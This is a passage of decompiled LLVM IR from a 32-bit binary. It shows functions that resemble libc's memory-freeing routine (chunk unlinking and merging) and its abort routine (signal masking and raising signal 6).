; uselistorder directives
  uselistorder i32 %v0_804ea59, { 1, 0 }
  uselistorder i32 %v0_804ea15, { 1, 0 }
  uselistorder i32 %v1_804e9d3, { 1, 0 }
  uselistorder i32 %v2_804e9cc, { 1, 0 }
  uselistorder i32 %v1_804e9c4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804e9d0, { 1, 0 }
  uselistorder i32 %v3_804e97f, { 2, 1, 3, 0 }
  uselistorder i32 %v0_804e99c, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_804e979, { 1, 0, 3, 2 }
  uselistorder i32* %v3_804ea2a, { 1, 0 }
  uselistorder i32 %tmp11, { 3, 14, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 22, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16, 13, 14, 17, 18, 19, 20, 21, 23, 24, 25, 26 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_804eac1, { 1, 0 }
  uselistorder label %dec_label_pc_804ea4d, { 1, 0 }
  uselistorder label %dec_label_pc_804ea2d, { 1, 0 }
  uselistorder label %dec_label_pc_804e9f9, { 1, 0 }
  uselistorder label %dec_label_pc_804e9f1, { 1, 0 }
  uselistorder label %dec_label_pc_804e9bc, { 1, 0 }
}

define i32 @function_804eac9(i32 %arg1) local_unnamed_addr {
dec_label_pc_804eac9:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804eac9 = load i32, i32* @ebp, align 4
  %v0_804eaca = load i32, i32* @edi, align 4
  %v0_804eacb = load i32, i32* @esi, align 4
  %v0_804eacc = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804ead4 = icmp eq i32 %arg1, 0
  br i1 %v1_804ead4, label %dec_label_pc_804ec5d, label %dec_label_pc_804eadc

dec_label_pc_804eadc:                             ; preds = %dec_label_pc_804eac9
  %v2_804eae7 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804eae7, i32* @eax, align 4
  %v2_804eaec = call i32 @function_804f65e(i32 %v2_804eae7, i32 134542939)
  store i32 %v2_804eaec, i32* %eax.global-to-local, align 4
  %v1_804eaf8 = call i32 @function_804f65b(i32 ptrtoint (i32* @global_var_8056330.140 to i32))
  %v1_804eafd = add i32 %arg1, -8
  store i32 %v1_804eafd, i32* @ecx, align 4
  %v0_804eb00 = load i8, i8* @global_var_8058da0.141, align 1
  %v1_804eb00 = sext i8 %v0_804eb00 to i32
  store i32 %v1_804eb00, i32* %eax.global-to-local, align 4
  %v1_804eb05 = add i32 %arg1, -4
  %v2_804eb05 = inttoptr i32 %v1_804eb05 to i32*
  %v3_804eb05 = load i32, i32* %v2_804eb05, align 4
  store i32 %v3_804eb05, i32* @edx, align 4
  %v1_804eb0d = and i32 %v3_804eb05, -4
  %v4_804eb0d = trunc i32 %v1_804eb0d to i8
  store i32 %v1_804eb0d, i32* @ebx, align 4
  %v8_804eb12 = icmp ugt i8 %v4_804eb0d, %v0_804eb00
  br i1 %v8_804eb12, label %dec_label_pc_804eb34, label %dec_label_pc_804eb14

dec_label_pc_804eb14:                             ; preds = %dec_label_pc_804eadc
  %v1_804eb14 = or i32 %v1_804eb00, 3
  %v3_804eb14 = trunc i32 %v1_804eb14 to i8
  store i32 %v1_804eb14, i32* %eax.global-to-local, align 4
  %v2_804eb17 = udiv i32 %v3_804eb05, 8
  store i8 %v3_804eb14, i8* @global_var_8058da0.141, align 32
  %v1_804eb1f = mul nuw i32 %v2_804eb17, 4
  %v2_804eb1f = add i32 %v1_804eb1f, ptrtoint (i8* @global_var_8058da0.141 to i32)
  store i32 %v2_804eb1f, i32* @edx, align 4
  %v1_804eb26 = add i32 %v1_804eb1f, add (i32 ptrtoint (i8* @global_var_8058da0.141 to i32), i32 -4)
  %v2_804eb26 = inttoptr i32 %v1_804eb26 to i32*
  %v3_804eb26 = load i32, i32* %v2_804eb26, align 4
  store i32 %v3_804eb26, i32* %eax.global-to-local, align 4
  %v3_804eb29 = inttoptr i32 %arg1 to i32*
  store i32 %v3_804eb26, i32* %v3_804eb29, align 4
  %v0_804eb2c = load i32, i32* @ecx, align 4
  %v1_804eb2c = load i32, i32* @edx, align 4
  %v2_804eb2c = add i32 %v1_804eb2c, -4
  %v3_804eb2c = inttoptr i32 %v2_804eb2c to i32*
  store i32 %v0_804eb2c, i32* %v3_804eb2c, align 4
  br label %dec_label_pc_804ec4c

dec_label_pc_804eb34:                             ; preds = %dec_label_pc_804eadc
  %v2_804eb34 = and i32 %v3_804eb05, 2
  %v3_804eb34 = icmp eq i32 %v2_804eb34, 0
  %v1_804eb37 = icmp eq i1 %v3_804eb34, false
  br i1 %v1_804eb37, label %dec_label_pc_804ec2c, label %dec_label_pc_804eb3d

dec_label_pc_804eb3d:                             ; preds = %dec_label_pc_804eb34
  %v1_804eb3d = or i32 %v1_804eb00, 1
  %v3_804eb3d = trunc i32 %v1_804eb3d to i8
  store i32 %v1_804eb3d, i32* %eax.global-to-local, align 4
  store i8 %v3_804eb3d, i8* @global_var_8058da0.141, align 32
  %v2_804eb45 = add i32 %v1_804eb0d, %v1_804eafd
  store i32 %v2_804eb45, i32* @esi, align 4
  %v1_804eb48 = add i32 %v2_804eb45, 4
  %v2_804eb48 = inttoptr i32 %v1_804eb48 to i32*
  %v3_804eb48 = load i32, i32* %v2_804eb48, align 4
  store i32 %v3_804eb48, i32* %eax.global-to-local, align 4
  %v2_804eb4f = inttoptr i32 %v1_804eb05 to i8*
  %v3_804eb4f = load i8, i8* %v2_804eb4f, align 1
  %v4_804eb4f = urem i8 %v3_804eb4f, 2
  %v5_804eb4f = icmp eq i8 %v4_804eb4f, 0
  %v1_804eb53 = icmp eq i1 %v5_804eb4f, false
  br i1 %v1_804eb53, label %dec_label_pc_804eb76, label %dec_label_pc_804eb55

dec_label_pc_804eb55:                             ; preds = %dec_label_pc_804eb3d
  %v2_804eb55 = inttoptr i32 %v1_804eafd to i32*
  %v3_804eb55 = load i32, i32* %v2_804eb55, align 4
  store i32 %v3_804eb55, i32* @ebp, align 4
  %v2_804eb5a = sub i32 %v1_804eafd, %v3_804eb55
  store i32 %v2_804eb5a, i32* %eax.global-to-local, align 4
  %v1_804eb5c = add i32 %v2_804eb5a, 8
  %v2_804eb5c = inttoptr i32 %v1_804eb5c to i32*
  %v3_804eb5c = load i32, i32* %v2_804eb5c, align 4
  store i32 %v3_804eb5c, i32* @edi, align 4
  %v1_804eb5f = add i32 %v2_804eb5a, 12
  %v2_804eb5f = inttoptr i32 %v1_804eb5f to i32*
  %v3_804eb5f = load i32, i32* %v2_804eb5f, align 4
  store i32 %v3_804eb5f, i32* @edx, align 4
  %v1_804eb62 = add i32 %v3_804eb5c, 12
  %v2_804eb62 = inttoptr i32 %v1_804eb62 to i32*
  %v3_804eb62 = load i32, i32* %v2_804eb62, align 4
  store i32 %v3_804eb62, i32* @ecx, align 4
  %v12_804eb65 = icmp eq i32 %v3_804eb62, %v2_804eb5a
  %v1_804eb67 = icmp eq i1 %v12_804eb65, false
  br i1 %v1_804eb67, label %dec_label_pc_804eba5, label %dec_label_pc_804eb69

dec_label_pc_804eb69:                             ; preds = %dec_label_pc_804eb55
  %v1_804eb69 = add i32 %v3_804eb5f, 8
  %v2_804eb69 = inttoptr i32 %v1_804eb69 to i32*
  %v3_804eb69 = load i32, i32* %v2_804eb69, align 4
  %v15_804eb69 = icmp eq i32 %v3_804eb69, %v3_804eb62
  %v1_804eb6c = icmp eq i1 %v15_804eb69, false
  br i1 %v1_804eb6c, label %dec_label_pc_804eba5, label %dec_label_pc_804eb6e

dec_label_pc_804eb6e:                             ; preds = %dec_label_pc_804eb69
  %v2_804eb6e = add i32 %v3_804eb55, %v1_804eb0d
  store i32 %v2_804eb6e, i32* @ebx, align 4
  store i32 %v3_804eb5f, i32* %v2_804eb62, align 4
  %v0_804eb73 = load i32, i32* @edi, align 4
  %v1_804eb73 = load i32, i32* @edx, align 4
  %v2_804eb73 = add i32 %v1_804eb73, 8
  %v3_804eb73 = inttoptr i32 %v2_804eb73 to i32*
  store i32 %v0_804eb73, i32* %v3_804eb73, align 4
  %v0_804eb7d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804eb76

dec_label_pc_804eb76:                             ; preds = %dec_label_pc_804eb3d, %dec_label_pc_804eb6e
  %v1_804eb89 = phi i32 [ %v2_804eb45, %dec_label_pc_804eb3d ], [ %v0_804eb7d.pre, %dec_label_pc_804eb6e ]
  %v1_804eb7a = and i32 %v3_804eb48, -4
  store i32 %v1_804eb7a, i32* @ebp, align 4
  %v1_804eb7d = load i32, i32* @global_var_8058dcc.142, align 4
  %v12_804eb7d = icmp eq i32 %v1_804eb89, %v1_804eb7d
  br i1 %v12_804eb7d, label %dec_label_pc_804ebd7, label %dec_label_pc_804eb85

dec_label_pc_804eb85:                             ; preds = %dec_label_pc_804eb76
  %v2_804eb85 = add i32 %v1_804eb89, 4
  %v3_804eb85 = add i32 %v2_804eb85, %v1_804eb7a
  %v4_804eb85 = inttoptr i32 %v3_804eb85 to i32*
  %v5_804eb85 = load i32, i32* %v4_804eb85, align 4
  store i32 %v5_804eb85, i32* %eax.global-to-local, align 4
  %v3_804eb89 = inttoptr i32 %v2_804eb85 to i32*
  store i32 %v1_804eb7a, i32* %v3_804eb89, align 4
  %v0_804eb8c = load i32, i32* %eax.global-to-local, align 4
  %v1_804eb8c = urem i32 %v0_804eb8c, 2
  %v2_804eb8c = icmp eq i32 %v1_804eb8c, 0
  store i32 %v1_804eb8c, i32* %eax.global-to-local, align 4
  %v1_804eb91 = icmp eq i1 %v2_804eb8c, false
  br i1 %v1_804eb91, label %dec_label_pc_804ebb2, label %dec_label_pc_804eb93

dec_label_pc_804eb93:                             ; preds = %dec_label_pc_804eb85
  %v0_804eb93 = load i32, i32* @esi, align 4
  %v1_804eb93 = add i32 %v0_804eb93, 8
  %v2_804eb93 = inttoptr i32 %v1_804eb93 to i32*
  %v3_804eb93 = load i32, i32* %v2_804eb93, align 4
  store i32 %v3_804eb93, i32* @edx, align 4
  %v1_804eb96 = add i32 %v0_804eb93, 12
  %v2_804eb96 = inttoptr i32 %v1_804eb96 to i32*
  %v3_804eb96 = load i32, i32* %v2_804eb96, align 4
  store i32 %v3_804eb96, i32* %eax.global-to-local, align 4
  %v1_804eb99 = add i32 %v3_804eb93, 12
  %v2_804eb99 = inttoptr i32 %v1_804eb99 to i32*
  %v3_804eb99 = load i32, i32* %v2_804eb99, align 4
  store i32 %v3_804eb99, i32* @edi, align 4
  %v12_804eb9c = icmp eq i32 %v3_804eb99, %v0_804eb93
  %v1_804eb9e = icmp eq i1 %v12_804eb9c, false
  br i1 %v1_804eb9e, label %dec_label_pc_804eba5, label %dec_label_pc_804eba0

dec_label_pc_804eba0:                             ; preds = %dec_label_pc_804eb93
  %v1_804eba0 = add i32 %v3_804eb96, 8
  %v2_804eba0 = inttoptr i32 %v1_804eba0 to i32*
  %v3_804eba0 = load i32, i32* %v2_804eba0, align 4
  %v15_804eba0 = icmp eq i32 %v3_804eba0, %v3_804eb99
  br i1 %v15_804eba0, label %dec_label_pc_804ebaa, label %dec_label_pc_804eba5

dec_label_pc_804eba5:                             ; preds = %dec_label_pc_804eba0, %dec_label_pc_804eb93, %dec_label_pc_804eb69, %dec_label_pc_804eb55
  %v0_804eba5 = call i32 @function_804ec88()
  store i32 %v0_804eba5, i32* %eax.global-to-local, align 4
  %v1_804ebaa.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804ebaa

dec_label_pc_804ebaa:                             ; preds = %dec_label_pc_804eba0, %dec_label_pc_804eba5
  %v1_804ebaa = phi i32 [ %v3_804eb93, %dec_label_pc_804eba0 ], [ %v1_804ebaa.pre, %dec_label_pc_804eba5 ]
  %v0_804ebaa = phi i32 [ %v3_804eb96, %dec_label_pc_804eba0 ], [ %v0_804eba5, %dec_label_pc_804eba5 ]
  %v2_804ebaa = add i32 %v1_804ebaa, 12
  %v3_804ebaa = inttoptr i32 %v2_804ebaa to i32*
  store i32 %v0_804ebaa, i32* %v3_804ebaa, align 4
  %v0_804ebad = load i32, i32* @ebx, align 4
  %v1_804ebad = load i32, i32* @ebp, align 4
  %v2_804ebad = add i32 %v1_804ebad, %v0_804ebad
  store i32 %v2_804ebad, i32* @ebx, align 4
  %v0_804ebaf = load i32, i32* @edx, align 4
  %v1_804ebaf = load i32, i32* %eax.global-to-local, align 4
  %v2_804ebaf = add i32 %v1_804ebaf, 8
  %v3_804ebaf = inttoptr i32 %v2_804ebaf to i32*
  store i32 %v0_804ebaf, i32* %v3_804ebaf, align 4
  br label %dec_label_pc_804ebb2

dec_label_pc_804ebb2:                             ; preds = %dec_label_pc_804eb85, %dec_label_pc_804ebaa
  %v0_804ebb2 = load i32, i32* @global_var_8058ddc.160, align 4
  store i32 %v0_804ebb2, i32* %eax.global-to-local, align 4
  %v0_804ebb7 = load i32, i32* @ecx, align 4
  %v1_804ebb7 = add i32 %v0_804ebb7, 12
  %v2_804ebb7 = inttoptr i32 %v1_804ebb7 to i32*
  store i32 ptrtoint (i32* @global_var_8058dd4.144 to i32), i32* %v2_804ebb7, align 4
  %v0_804ebbe = load i32, i32* @ebx, align 4
  %v1_804ebbe = load i32, i32* @ecx, align 4
  %v3_804ebbe = add i32 %v1_804ebbe, %v0_804ebbe
  %v4_804ebbe = inttoptr i32 %v3_804ebbe to i32*
  store i32 %v0_804ebbe, i32* %v4_804ebbe, align 4
  %v0_804ebc1 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ebc1 = load i32, i32* @ecx, align 4
  %v2_804ebc1 = add i32 %v1_804ebc1, 8
  %v3_804ebc1 = inttoptr i32 %v2_804ebc1 to i32*
  store i32 %v0_804ebc1, i32* %v3_804ebc1, align 4
  %v0_804ebc4 = load i32, i32* @ecx, align 4
  %v1_804ebc4 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ebc4 = add i32 %v1_804ebc4, 12
  %v3_804ebc4 = inttoptr i32 %v2_804ebc4 to i32*
  store i32 %v0_804ebc4, i32* %v3_804ebc4, align 4
  %v0_804ebc7 = load i32, i32* @ebx, align 4
  %v1_804ebc9 = or i32 %v0_804ebc7, 1
  store i32 %v1_804ebc9, i32* %eax.global-to-local, align 4
  %v0_804ebcc = load i32, i32* @ecx, align 4
  store i32 %v0_804ebcc, i32* @global_var_8058ddc.160, align 4
  %v2_804ebd2 = add i32 %v0_804ebcc, 4
  %v3_804ebd2 = inttoptr i32 %v2_804ebd2 to i32*
  store i32 %v1_804ebc9, i32* %v3_804ebd2, align 4
  br label %dec_label_pc_804ebe7

dec_label_pc_804ebd7:                             ; preds = %dec_label_pc_804eb76
  %v0_804ebd7 = load i32, i32* @ebx, align 4
  %v2_804ebd7 = add i32 %v0_804ebd7, %v1_804eb7a
  store i32 %v2_804ebd7, i32* @ebx, align 4
  %v1_804ebdb = or i32 %v2_804ebd7, 1
  store i32 %v1_804ebdb, i32* %eax.global-to-local, align 4
  %v1_804ebde = load i32, i32* @ecx, align 4
  %v2_804ebde = add i32 %v1_804ebde, 4
  %v3_804ebde = inttoptr i32 %v2_804ebde to i32*
  store i32 %v1_804ebdb, i32* %v3_804ebde, align 4
  %v0_804ebe1 = load i32, i32* @ecx, align 4
  store i32 %v0_804ebe1, i32* @global_var_8058dcc.142, align 4
  br label %dec_label_pc_804ebe7

dec_label_pc_804ebe7:                             ; preds = %dec_label_pc_804ebb2, %dec_label_pc_804ebd7
  %v0_804ebe7 = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_804ebe7, 131072
  br i1 %tmp, label %dec_label_pc_804ec4c, label %dec_label_pc_804ebef

dec_label_pc_804ebef:                             ; preds = %dec_label_pc_804ebe7
  %v0_804ebef = load i8, i8* @global_var_8058da0.141, align 32
  %v1_804ebef = and i8 %v0_804ebef, 2
  %v2_804ebef = icmp eq i8 %v1_804ebef, 0
  br i1 %v2_804ebef, label %dec_label_pc_804ec08, label %dec_label_pc_804ebf8

dec_label_pc_804ebf8:                             ; preds = %dec_label_pc_804ebef
  %v2_804ec00 = call i32 @function_804e921(i32* bitcast (i8* @global_var_8058da0.141 to i32*))
  store i32 %v2_804ec00, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ec08

dec_label_pc_804ec08:                             ; preds = %dec_label_pc_804ebef, %dec_label_pc_804ebf8
  %v0_804ec08 = load i32, i32* @global_var_8058dcc.142, align 4
  store i32 %v0_804ec08, i32* %eax.global-to-local, align 4
  %v1_804ec0d = add i32 %v0_804ec08, 4
  %v2_804ec0d = inttoptr i32 %v1_804ec0d to i32*
  %v3_804ec0d = load i32, i32* %v2_804ec0d, align 4
  %v1_804ec10 = and i32 %v3_804ec0d, -4
  store i32 %v1_804ec10, i32* %eax.global-to-local, align 4
  %v1_804ec13 = load i32, i32* @global_var_80590e4.158, align 4
  %v7_804ec13 = icmp ult i32 %v1_804ec10, %v1_804ec13
  br i1 %v7_804ec13, label %dec_label_pc_804ec4c, label %dec_label_pc_804ec1b

dec_label_pc_804ec1b:                             ; preds = %dec_label_pc_804ec08
  %v0_804ec1b = load i32, i32* @global_var_80590e8.156, align 8
  store i32 %v0_804ec1b, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_8058da0.141 to i32), i32* @edx, align 4
  %v0_804ec25 = call i32 @function_804e894()
  store i32 %v0_804ec25, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ec4c

dec_label_pc_804ec2c:                             ; preds = %dec_label_pc_804eb34
  %v2_804ec2c = inttoptr i32 %v1_804eafd to i32*
  %v3_804ec2c = load i32, i32* %v2_804ec2c, align 4
  %v0_804ec2f = load i32, i32* @global_var_80590f0.149, align 16
  %v1_804ec2f = add i32 %v0_804ec2f, -1
  store i32 %v1_804ec2f, i32* @global_var_80590f0.149, align 16
  %v2_804ec35 = add i32 %v3_804ec2c, %v1_804eb0d
  store i32 %v2_804ec35, i32* %eax.global-to-local, align 4
  %v2_804ec38 = sub i32 %v1_804eafd, %v3_804ec2c
  %v0_804ec3e = load i32, i32* @global_var_8059104.153, align 4
  %v2_804ec3e = sub i32 %v0_804ec3e, %v2_804ec35
  store i32 %v2_804ec3e, i32* @global_var_8059104.153, align 4
  %v4_804ec44 = inttoptr i32 %v2_804ec38 to i32*
  %v5_804ec44 = call i32 @function_804fcbc(i32* %v4_804ec44, i32 %v2_804ec35, i32 %v1_804eb0d, i32 %v1_804eb0d)
  store i32 %v5_804ec44, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ec4c

dec_label_pc_804ec4c:                             ; preds = %dec_label_pc_804ec08, %dec_label_pc_804ebe7, %dec_label_pc_804ec1b, %dec_label_pc_804eb14, %dec_label_pc_804ec2c
  store i32 %v2_804eae7, i32* @eax, align 4
  %v2_804ec55 = call i32 @function_804f65e(i32 %v2_804eae7, i32 1)
  store i32 %v2_804ec55, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ec5d

dec_label_pc_804ec5d:                             ; preds = %dec_label_pc_804eac9, %dec_label_pc_804ec4c
  %.0 = phi i32 [ undef, %dec_label_pc_804eac9 ], [ %v2_804ec55, %dec_label_pc_804ec4c ]
  store i32 %v0_804eacc, i32* @ebx, align 4
  store i32 %v0_804eacb, i32* @esi, align 4
  store i32 %v0_804eaca, i32* @edi, align 4
  store i32 %v0_804eac9, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_804ec2c, { 1, 0 }
  uselistorder i32 %v0_804ebbe, { 1, 0 }
  uselistorder i32 %v1_804eb8c, { 1, 0 }
  uselistorder i32 %v2_804eb85, { 1, 0 }
  uselistorder i32 %v1_804eb7a, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804eb89, { 1, 0 }
  uselistorder i32 %v1_804eb0d, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_804eb05, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804eafd, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* bitcast (i8* @global_var_8058da0.141 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8058dd4.144 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_8058dcc.142, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_8056330.140 to i32), { 0, 1, 3, 2, 4 }
  uselistorder i32 %arg1, { 0, 3, 4, 2, 1 }
  uselistorder label %dec_label_pc_804ec5d, { 1, 0 }
  uselistorder label %dec_label_pc_804ec4c, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_804ec08, { 1, 0 }
  uselistorder label %dec_label_pc_804ebe7, { 1, 0 }
  uselistorder label %dec_label_pc_804ebb2, { 1, 0 }
  uselistorder label %dec_label_pc_804ebaa, { 1, 0 }
  uselistorder label %dec_label_pc_804eb76, { 1, 0 }
}

define i32 @function_804ec65(i32 %arg1) local_unnamed_addr {
dec_label_pc_804ec65:
  %v0_804ec65 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_804ec72 = call i32 @function_804e921(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_8058da0.141 to i8) to i32) to i32*))
  store i32 ptrtoint (i8* @global_var_8058da0.141 to i32), i32* @edx, align 4
  %v0_804ec7f = load i32, i32* @ebx, align 4
  store i32 %v0_804ec7f, i32* @eax, align 4
  store i32 %v0_804ec65, i32* @ebx, align 4
  %v0_804ec82 = call i32 @function_804e894()
  ret i32 %v0_804ec82

; uselistorder directives
  uselistorder i32 ()* @function_804e894, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_8058da0.141 to i32), { 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_8058da0.141, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @function_804ec88() local_unnamed_addr {
dec_label_pc_804ec88:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_804ec94 = call i32 @function_804f65b(i32 ptrtoint (i32* @global_var_8056348.161 to i32))
  %v12_804ec9e = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804eca3

dec_label_pc_804eca3:                             ; preds = %dec_label_pc_804eca3.dec_label_pc_804eca3_crit_edge, %dec_label_pc_804ec88
  %v0_804eca3 = phi i32 [ %v12_804ec9e, %dec_label_pc_804ec88 ], [ %v0_804eca3.pre, %dec_label_pc_804eca3.dec_label_pc_804eca3_crit_edge ]
  %v1_804ecae19 = phi i32 [ 31, %dec_label_pc_804ec88 ], [ %v1_804ecae, %dec_label_pc_804eca3.dec_label_pc_804eca3_crit_edge ]
  %v2_804eca3 = mul i32 %v1_804ecae19, 4
  %v3_804eca3 = add i32 %v2_804eca3, 152
  %v4_804eca3 = add i32 %v3_804eca3, %v0_804eca3
  %v5_804eca3 = inttoptr i32 %v4_804eca3 to i32*
  store i32 0, i32* %v5_804eca3, align 4
  %v0_804ecae.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804ecae = add i32 %v0_804ecae.pre, -1
  %v9_804ecae = icmp slt i32 %v1_804ecae, 0
  store i32 %v1_804ecae, i32* %eax.global-to-local, align 4
  %v1_804ecaf = icmp eq i1 %v9_804ecae, false
  br i1 %v1_804ecaf, label %dec_label_pc_804eca3.dec_label_pc_804eca3_crit_edge, label %dec_label_pc_804ecb1

dec_label_pc_804eca3.dec_label_pc_804eca3_crit_edge: ; preds = %dec_label_pc_804eca3
  %v0_804eca3.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804eca3

dec_label_pc_804ecb1:                             ; preds = %dec_label_pc_804eca3
  %v0_804ecb1 = load i32, i32* @ebx, align 4
  %v2_804ecb5 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_804ecb5, i32* @ebx, align 4
  %v4_804ecbd = call i32 @function_8051638(i32 %v2_804ecb5, i32 6, i32 %v0_804ecb1, i32 %v0_804ecb1)
  store i32 %v4_804ecbd, i32* %eax.global-to-local, align 4
  %v1_804ecc5 = icmp eq i32 %v4_804ecbd, 0
  %v1_804ecc7 = icmp eq i1 %v1_804ecc5, false
  br i1 %v1_804ecc7, label %dec_label_pc_804ecd7, label %dec_label_pc_804ecc9

dec_label_pc_804ecc9:                             ; preds = %dec_label_pc_804ecb1
  %v3_804eccf = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_804eccf = call i32 @function_804fe08(i32 1, %_TYPEDEF_sigset_t* %v3_804eccf, i32 0)
  store i32 %v4_804eccf, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ecd7

dec_label_pc_804ecd7:                             ; preds = %dec_label_pc_804ecb1, %dec_label_pc_804ecc9
  %v2_804ed0f4 = phi i32 [ %v4_804ecbd, %dec_label_pc_804ecb1 ], [ %v4_804eccf, %dec_label_pc_804ecc9 ]
  %v0_804ecd7 = load i8, i8* @global_var_8058b00.162, align 256
  %v1_804ecd7 = icmp eq i8 %v0_804ecd7, 0
  %v1_804ecde = icmp eq i1 %v1_804ecd7, false
  br i1 %v1_804ecde, label %dec_label_pc_804ed0f, label %dec_label_pc_804ece0

dec_label_pc_804ece0:                             ; preds = %dec_label_pc_804ecd7
  store i8 1, i8* @global_var_8058b00.162, align 256
  br label %dec_label_pc_804ece7

dec_label_pc_804ece7:                             ; preds = %dec_label_pc_804ed4e, %dec_label_pc_804ece0
  %v1_804ecef = call i32 @function_804f65b(i32 ptrtoint (i32* @global_var_8056348.161 to i32))
  store i32 %v1_804ecef, i32* %eax.global-to-local, align 4
  %v1_804ecfb = call i32 @function_80515fc(i32 6)
  store i32 %v1_804ecfb, i32* %eax.global-to-local, align 4
  %v1_804ed07 = call i32 @function_804f65b(i32 ptrtoint (i32* @global_var_8056348.161 to i32))
  store i32 %v1_804ed07, i32* %eax.global-to-local, align 4
  %v0_804ed0f.pre = load i8, i8* @global_var_8058b00.162, align 256
  br label %dec_label_pc_804ed0f

dec_label_pc_804ed0f:                             ; preds = %dec_label_pc_804ecd7, %dec_label_pc_804ece7
  %v2_804ed0f = phi i32 [ %v2_804ed0f4, %dec_label_pc_804ecd7 ], [ %v1_804ed07, %dec_label_pc_804ece7 ]
  %v0_804ed0f = phi i8 [ %v0_804ecd7, %dec_label_pc_804ecd7 ], [ %v0_804ed0f.pre, %dec_label_pc_804ece7 ]
  %v1_804ed0f = zext i8 %v0_804ed0f to i32
  %v3_804ed0f = and i32 %v2_804ed0f, -256
  %v4_804ed0f = or i32 %v1_804ed0f, %v3_804ed0f
  store i32 %v4_804ed0f, i32* %eax.global-to-local, align 4
  %v10_804ed14 = icmp eq i8 %v0_804ed0f, 1
  %v1_804ed16 = icmp eq i1 %v10_804ed14, false
  br i1 %v1_804ed16, label %dec_label_pc_804ed70, label %dec_label_pc_804ed18

dec_label_pc_804ed18:                             ; preds = %dec_label_pc_804ed0f
  %v2_804ed20 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_804ed20, i32* %eax.global-to-local, align 4
  store i8 2, i8* @global_var_8058b00.162, align 256
  %v3_804ed2c = bitcast i32* %stack_var_-272 to i8*
  %v4_804ed2c = call i32 @function_804d4e0(i8* %v3_804ed2c, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ed43

dec_label_pc_804ed43:                             ; preds = %dec_label_pc_804ed43.dec_label_pc_804ed43_crit_edge, %dec_label_pc_804ed18
  %v0_804ed43 = phi i32 [ %v12_804ec9e, %dec_label_pc_804ed18 ], [ %v0_804ed43.pre, %dec_label_pc_804ed43.dec_label_pc_804ed43_crit_edge ]
  %v1_804ed4b18 = phi i32 [ 31, %dec_label_pc_804ed18 ], [ %v1_804ed4b, %dec_label_pc_804ed43.dec_label_pc_804ed43_crit_edge ]
  %v2_804ed43 = mul i32 %v1_804ed4b18, 4
  %v3_804ed43 = add i32 %v2_804ed43, 16
  %v4_804ed43 = add i32 %v3_804ed43, %v0_804ed43
  %v5_804ed43 = inttoptr i32 %v4_804ed43 to i32*
  store i32 -1, i32* %v5_804ed43, align 4
  %v0_804ed4b.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804ed4b = add i32 %v0_804ed4b.pre, -1
  %v9_804ed4b = icmp slt i32 %v1_804ed4b, 0
  store i32 %v1_804ed4b, i32* %eax.global-to-local, align 4
  %v1_804ed4c = icmp eq i1 %v9_804ed4b, false
  br i1 %v1_804ed4c, label %dec_label_pc_804ed43.dec_label_pc_804ed43_crit_edge, label %dec_label_pc_804ed4e

dec_label_pc_804ed43.dec_label_pc_804ed43_crit_edge: ; preds = %dec_label_pc_804ed43
  %v0_804ed43.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ed43

dec_label_pc_804ed4e:                             ; preds = %dec_label_pc_804ed43
  store i32 %v2_804ed20, i32* %eax.global-to-local, align 4
  %v5_804ed63 = call i32 @function_804f89f(i32 6, i32* nonnull %stack_var_-272, i32 0, i32 %v1_804ed4b)
  store i32 %v5_804ed63, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ece7

